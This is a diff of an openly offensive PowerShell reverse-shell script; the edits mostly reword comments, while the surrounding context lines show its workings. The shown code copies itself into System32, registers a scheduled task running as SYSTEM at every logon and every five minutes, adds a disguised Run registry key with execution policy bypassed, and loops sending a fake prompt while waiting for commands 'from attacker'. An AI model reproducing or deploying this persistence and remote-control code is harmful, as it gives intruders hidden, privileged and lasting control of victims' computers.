@@ -22,7 +22,7 @@ $writer.WriteLine((Get-Command | Out-String))
 
 $writer.WriteLine($scriptPath)
 
-#initializing scheduledtask shit
+#initializing scheduledtask variables
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $trigger.Repetition = (New-ScheduledTaskTrigger -Once -At "12am" -RepetitionInterval (New-TimeSpan -Minutes 5)).repetition
 $taskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
@@ -60,6 +60,7 @@ $taskName = "windows_reverse_tool"
 if (-not (Test-Path -path "C:\Windows\System32\reverseShell.ps1")){
     Copy-Item -Path $scriptPath -Destination "C:\Windows\System32\reverseShell.ps1" -Force
 }
+#commented because it opens incorrectly
 #if (-not (Test-Path -path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1")){
 #    Copy-Item -Path $scriptPath -Destination "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1" -Force
 #}
@@ -75,7 +76,7 @@ Register-ScheduledTask -Action $action -Trigger $trigger -Principal $taskPrincip
 #makes sure the file is run every login
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "windowsImportantDawgWalking" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \Start-Process powershell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File $scriptPath -Verb RunAs\"
 
-#infinite loop
+#infinite loop should be moved so connection is retried if it doesn't connect
 while ($true) { 
    $writer.Write("PS C:\> ")
 #wait for a command from attacker
